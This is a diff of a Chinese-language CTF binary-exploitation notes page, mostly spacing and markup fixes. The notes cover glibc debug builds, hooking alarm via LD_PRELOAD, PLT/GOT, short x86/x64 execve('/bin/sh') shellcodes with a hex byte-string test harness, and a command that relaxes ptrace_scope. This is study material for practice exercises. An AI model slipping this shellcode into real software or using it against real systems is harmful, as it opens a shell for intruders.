@@ -422,30 +422,6 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Web&Attack/php_attack/" title="Php attack" class="md-nav__link">
-      Php attack
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
-    <a href="../../../Web&Attack/upload&parsing/" title="Upload&parsing" class="md-nav__link">
-      Upload&parsing
-    </a>
-  </li>
-
-        
-          
-          
-          
-
-
-  <li class="md-nav__item">
     <a href="../../../Web&Attack/wlan/" title="Wlan" class="md-nav__link">
       Wlan
     </a>
@@ -531,13 +507,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-14" type="checkbox" id="nav-2-14">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-12" type="checkbox" id="nav-2-12">
     
-    <label class="md-nav__link" for="nav-2-14">
+    <label class="md-nav__link" for="nav-2-12">
       Shell
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
-      <label class="md-nav__title" for="nav-2-14">
+      <label class="md-nav__title" for="nav-2-12">
         Shell
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -550,13 +526,13 @@
 
   <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-14-1" type="checkbox" id="nav-2-14-1">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-12-1" type="checkbox" id="nav-2-12-1">
     
-    <label class="md-nav__link" for="nav-2-14-1">
+    <label class="md-nav__link" for="nav-2-12-1">
       Php
     </label>
     <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
-      <label class="md-nav__title" for="nav-2-14-1">
+      <label class="md-nav__title" for="nav-2-12-1">
         Php
       </label>
       <ul class="md-nav__list" data-md-scrollfix>
@@ -1879,8 +1855,8 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#debug-symbolglibc" class="md-nav__link">
-    编译带debug symbol的glibc
+  <a href="#debug-symbol-glibc" class="md-nav__link">
+    编译带 debug symbol 的 glibc
   </a>
   
     <nav class="md-nav">
@@ -1921,7 +1897,7 @@
       
         <li class="md-nav__item">
   <a href="#alarm" class="md-nav__link">
-    干掉alarm
+    干掉 alarm
   </a>
   
 </li>
@@ -1929,6 +1905,13 @@
         <li class="md-nav__item">
   <a href="#plt-got-pltgot" class="md-nav__link">
     plt got .plt.got
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pic-pie" class="md-nav__link">
+    PIC 地址无关 PIE
   </a>
   
 </li>
@@ -1969,7 +1952,7 @@
       
         <li class="md-nav__item">
   <a href="#shellcode_1" class="md-nav__link">
-    生成可打印的shellcode
+    生成可打印的 shellcode
   </a>
   
 </li>
@@ -1977,6 +1960,13 @@
         <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
     漏洞挖掘方法
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    根据漏洞写出 EXP，发动攻击
   </a>
   
 </li>
@@ -2686,8 +2676,8 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#debug-symbolglibc" class="md-nav__link">
-    编译带debug symbol的glibc
+  <a href="#debug-symbol-glibc" class="md-nav__link">
+    编译带 debug symbol 的 glibc
   </a>
   
     <nav class="md-nav">
@@ -2728,7 +2718,7 @@
       
         <li class="md-nav__item">
   <a href="#alarm" class="md-nav__link">
-    干掉alarm
+    干掉 alarm
   </a>
   
 </li>
@@ -2736,6 +2726,13 @@
         <li class="md-nav__item">
   <a href="#plt-got-pltgot" class="md-nav__link">
     plt got .plt.got
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pic-pie" class="md-nav__link">
+    PIC 地址无关 PIE
   </a>
   
 </li>
@@ -2776,7 +2773,7 @@
       
         <li class="md-nav__item">
   <a href="#shellcode_1" class="md-nav__link">
-    生成可打印的shellcode
+    生成可打印的 shellcode
   </a>
   
 </li>
@@ -2784,6 +2781,13 @@
         <li class="md-nav__item">
   <a href="#_4" class="md-nav__link">
     漏洞挖掘方法
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    根据漏洞写出 EXP，发动攻击
   </a>
   
 </li>
@@ -2854,47 +2858,52 @@ https://www.exploit-db.com/shellcodes/
 [PIE无关](https://bbs.ichunqiu.com/thread-43627-1-1.html)
 </pre></div>
 
-<h2 id="debug-symbolglibc">编译带debug symbol的glibc<a class="headerlink" href="#debug-symbolglibc" title="Permanent link">&para;</a></h2>
+<h2 id="debug-symbol-glibc">编译带 debug symbol 的 glibc<a class="headerlink" href="#debug-symbol-glibc" title="Permanent link">&para;</a></h2>
 <h3 id="download">download<a class="headerlink" href="#download" title="Permanent link">&para;</a></h3>
 <p><a href="http://gnu.mirrors.pair.com/libc/">glibc</a></p>
 <h3 id="make">make<a class="headerlink" href="#make" title="Permanent link">&para;</a></h3>
-<p>解压后，要创建额外的build目录，直接在glibc目录下创建了build目录<code>mkdir build &amp;&amp; cd build</code>，使用下面的命令进行编译,
-<code>CFLAGS</code> makefile编译选项
-<code>-g</code>:包含调试信息是OS native format
-<code>-ggdb</code>: 供gdb使用的调试信息
-<code>-g3</code>: 产生额外的debug信息
-<code>-gdwarf-4</code>: 产生dwarf格式的debug info，产生 <code>.debug_info</code>段
+<p>解压后，要创建额外的 build 目录，直接在 glibc 目录下创建了 build 目录<code>mkdir build &amp;&amp; cd build</code>，使用下面的命令进行编译,
+<code>CFLAGS</code> makefile 编译选项
+<code>-g</code>:包含调试信息是 OS native format
+<code>-ggdb</code>: 供 gdb 使用的调试信息
+<code>-g3</code>: 产生额外的 debug 信息
+<code>-gdwarf-4</code>: 产生 dwarf 格式的 debug info，产生 <code>.debug_info</code>段
 <code>-Og</code> 启用不影响调试的编译优化
 <code>--prefix</code> 安装路径
-<code>--disable-sanity-checks</code> 关闭适应性检查。可能与GNU/Linux行为不一致</p>
-<div class="codehilite"><pre><span></span><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span> <span class="nv">CXXFLAGS</span><span class="o">=</span><span class="s2">&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span> ../configure --prefix<span class="o">=</span>/root/app/glibc22364 --disable-werror 
+<code>--disable-sanity-checks</code> 关闭适应性检查。可能与 GNU/Linux 行为不一致</p>
+<div class="codehilite"><pre><span></span><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span> <span class="nv">CXXFLAGS</span><span class="o">=</span><span class="s2">&quot;-g -g3 -ggdb -gdwarf-4 -Og&quot;</span> ../configure --prefix<span class="o">=</span>/root/app/glibc22364 --disable-werror
 </pre></div>
 
 <h3 id="use">use<a class="headerlink" href="#use" title="Permanent link">&para;</a></h3>
 <p>运行前需要加环境变量,
 example:`export LD_LIBRARY_PATH=/root/app/glibc22364/lib/</p>
 <h3 id="_2">排错<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<p><code>loc1@GLIBC_2.17' can't be versioned to common symbol 'loc1'</code> 这是一个bug，在<a href="https://stackoverflow.com/questions/51279418/how-to-build-older-version-of-glibc">这里</a>可以找到解决方法。</p>
-<h2 id="alarm">干掉alarm<a class="headerlink" href="#alarm" title="Permanent link">&para;</a></h2>
-<p>很多题目都有alarm函数防止Dos攻击，超过指定的时候后程序就会退出，不便于debug，通常有几种干掉alarm的方法：
-- vim: <code>%s/alarm/isnan/g</code>
-- <code>sed-i s/alarm/isnan/g [elf name]</code>
-- LD_PRELOAD
+<p><code>loc1@GLIBC_2.17' can't be versioned to common symbol 'loc1'</code> 这是一个 bug，在<a href="https://stackoverflow.com/questions/51279418/how-to-build-older-version-of-glibc">这里</a>可以找到解决方法。</p>
+<h2 id="alarm">干掉 alarm<a class="headerlink" href="#alarm" title="Permanent link">&para;</a></h2>
+<p>很多题目都有 alarm 函数防止 Dos 攻击，超过指定的时候后程序就会退出，不便于 debug，通常有几种干掉 alarm 的方法：</p>
+<ul>
+<li>vim: <code>%s/alarm/isnan/g</code></li>
+<li><code>sed-i s/alarm/isnan/g [elf name]</code></li>
+<li>LD_PRELOAD</li>
+</ul>
 <div class="codehilite"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">alarm</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seconds</span><span class="p">){</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="n">seconds</span><span class="p">);</span>
 <span class="p">}</span>
 </pre></div>
-编译：<code>gcc -shared [-fPIE/-fPIC] [-m32] hook.c -o hook.so</code><br />
+
+<p>编译：<code>gcc -shared [-fPIE/-fPIC] [-m32] hook.c -o hook.so</code><br />
 运行：<code>LD_PRELOAD=./hook.so ./pwnme</code></p>
 <h2 id="plt-got-pltgot">plt got .plt.got<a class="headerlink" href="#plt-got-pltgot" title="Permanent link">&para;</a></h2>
 <p><img alt="plt-&gt;got" src="2018-11-15-23-44-54.png" />
 <img alt="plt &amp;got" src="2018-11-15-23-25-29.png" />
-plt 指向got,采用延时绑定。printf函数中，0x404c010实际内容是下一条指令<code>push 0</code>,
-而plt.got是已经绑定的， puts函数的0x804bff4是指向实际puts函数的</p>
+plt 指向 got,采用延时绑定。printf 函数中，0x404c010 实际内容是下一条指令<code>push 0</code>,
+而 plt.got 是已经绑定的， puts 函数的 0x804bff4 是指向实际 puts 函数的</p>
+<h2 id="pic-pie">PIC 地址无关 PIE<a class="headerlink" href="#pic-pie" title="Permanent link">&para;</a></h2>
+<p><a href="https://www.polarxiong.com/archives/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3DLL%E4%B8%8D%E6%98%AF%E5%9C%B0%E5%9D%80%E6%97%A0%E5%85%B3%E7%9A%84-DLL%E4%B8%8EELF%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90.html">看这篇文章</a></p>
 <h2 id="shellcode">shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h2>
 <h3 id="x86">x86<a class="headerlink" href="#x86" title="Permanent link">&para;</a></h3>
-<p><div class="codehilite"><pre><span></span>jmp sh
+<div class="codehilite"><pre><span></span>jmp sh
 run:
   pop ebx
   mov BYTE[ebx+7],0 ;append 0 to /bin/sh
@@ -2907,18 +2916,20 @@ sh:
   call run
   db &quot;/bin/sh&quot;
 </pre></div>
-20bytes:
-<div class="codehilite"><pre><span></span>  xor ecx,ecx 
+
+<p>20bytes:</p>
+<div class="codehilite"><pre><span></span>  xor ecx,ecx
   cdq
-  push ecx 
-  push 0x68732f2f 
-  push 0x6e69622f 
-  mov ebx,esp 
-  mov al,0xb 
+  push ecx
+  push 0x68732f2f
+  push 0x6e69622f
+  mov ebx,esp
+  mov al,0xb
   int 0x80
-</pre></div></p>
+</pre></div>
+
 <h3 id="x64">x64<a class="headerlink" href="#x64" title="Permanent link">&para;</a></h3>
-<p>24bytes:
+<p>24bytes:</p>
 <div class="codehilite"><pre><span></span>global _start
 section .text
 _start:
@@ -2936,7 +2947,8 @@ _start:
     pop rsi
     syscall
 </pre></div>
-22bytes:
+
+<p>22bytes:</p>
 <div class="codehilite"><pre><span></span>    push 59
     pop rax
     cdq
@@ -2948,7 +2960,8 @@ _start:
   push rdx
     pop rsi
     syscall
-</pre></div></p>
+</pre></div>
+
 <div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 <span class="kt">char</span> <span class="n">code24</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05</span><span class="s">&quot;</span><span class="p">;</span>
@@ -2962,37 +2975,40 @@ _start:
 </pre></div>
 
 <h3 id="_3">制作方法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<p>linux 下
-- 使用<code>nasm [sourcecode] -o [target] -felf32</code>编译一个汇编文件 
-- 使用<code>objcopy -O binary [source.out] [target]</code>提取 shellcode的。
-- 使用<code>xxd -i [target]</code>将上述shellcode转为char数组
-相关工具
-- <a href="https://github.com/Neetx/Shellcode-Extractor">https://github.com/Neetx/Shellcode-Extractor</a>
-从elf提取shellcode</p>
-<h2 id="shellcode_1">生成可打印的shellcode<a class="headerlink" href="#shellcode_1" title="Permanent link">&para;</a></h2>
+<p>linux 下</p>
+<ul>
+<li>使用<code>nasm [sourcecode] -o [target] -felf32</code>编译一个汇编文件</li>
+<li>使用<code>objcopy -O binary [source.out] [target]</code>提取 shellcode 的。</li>
+<li>使用<code>xxd -i [target]</code>将上述 shellcode 转为 char 数组
+  相关工具</li>
+<li><a href="https://github.com/Neetx/Shellcode-Extractor">https://github.com/Neetx/Shellcode-Extractor</a>
+  从 elf 提取 shellcode</li>
+</ul>
+<h2 id="shellcode_1">生成可打印的 shellcode<a class="headerlink" href="#shellcode_1" title="Permanent link">&para;</a></h2>
 <p>TODO:<br />
 <a href="http://blog.eonew.cn/archives/1125">http://blog.eonew.cn/archives/1125</a></p>
 <h2 id="_4">漏洞挖掘方法<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 <ul>
-<li>现成CMS注意DIFF</li>
-<li>根据漏洞PATCH</li>
-<li>根据漏洞写出EXP，发动攻击 </li>
-<li></li>
+<li>现成 CMS 注意 DIFF</li>
+<li>根据漏洞 PATCH</li>
+<li>
+<h2 id="exp">根据漏洞写出 EXP，发动攻击<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+</li>
 </ul>
 <h2 id="_5">保护<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
-<p>NX:DEP 栈不可执行，可执行不可写 ROP绕过
-ALSR: 把每次载入的函数地址随机化，利用puts/printf 等leak出libc的实际地址</p>
+<p>NX:DEP 栈不可执行，可执行不可写 ROP 绕过
+ALSR: 把每次载入的函数地址随机化，利用 puts/printf 等 leak 出 libc 的实际地址</p>
 <h2 id="strace">strace<a class="headerlink" href="#strace" title="Permanent link">&para;</a></h2>
-<p>strace可以输出系统调用，应对一些打开就退出的情况，可以使用<code>strace -e trace=read,write [elf name]</code>来追踪特定的系统调用</p>
+<p>strace 可以输出系统调用，应对一些打开就退出的情况，可以使用<code>strace -e trace=read,write [elf name]</code>来追踪特定的系统调用</p>
 <h2 id="gdb-attach">gdb attach 失败<a class="headerlink" href="#gdb-attach" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span><span class="nb">echo</span> <span class="m">0</span> <span class="p">|</span>sudo tee /proc/sys/kernel/yama/ptrace_scope
 </pre></div>
 
 <h2 id="ld_preload-ld_show_auxv">LD_PRELOAD、 LD_SHOW_AUXV<a class="headerlink" href="#ld_preload-ld_show_auxv" title="Permanent link">&para;</a></h2>
 <ul>
-<li>LD_PRELOAD可以指定一个或多个共享库文件，linux加载器<code>ld-linux</code>会先于glibc加载LD_PRELOAD指定的库。<br />
-用途：HOOK掉alarm。<br />
-为了避免用于恶意攻击，在ruid !=euid的情况下加载器是不会使用LD_PRELOAD 进行预加载。</li>
+<li>LD_PRELOAD 可以指定一个或多个共享库文件，linux 加载器<code>ld-linux</code>会先于 glibc 加载 LD_PRELOAD 指定的库。<br />
+  用途：HOOK 掉 alarm。<br />
+  为了避免用于恶意攻击，在 ruid !=euid 的情况下加载器是不会使用 LD_PRELOAD 进行预加载。</li>
 <li><code>LD_SHOW_AUXV=1 ./pwnme</code> 用于调试</li>
 </ul>
                 
